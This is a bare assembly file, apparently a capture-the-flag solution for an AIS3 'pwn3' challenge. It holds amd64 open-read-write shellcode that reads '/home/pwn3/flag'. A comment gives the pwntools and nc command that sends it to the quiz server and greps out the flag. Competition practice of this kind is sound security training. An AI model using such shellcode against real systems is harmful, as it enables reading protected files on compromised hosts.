; pwn asm -c amd64 < pwn3.S | nc quiz.ais3.org 9563 | head -c 2048 | grep -o 'ais3{.*}'
mov rax, 0x0000616c662f336e
push rax
mov byte ptr [rsp+6], 'g'
mov rax, 0x77702f656d6f682f
push rax

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx

push 2
pop rax
syscall



LP:
push 3
pop rdi
mov rsi, rsp
push 0x28
pop rdx

xor rax, rax
syscall



xor rdi, rdi
inc rdi
mov rsi, rsp
push 0x28
pop rdx

push 1
pop rax
syscall
jmp LP
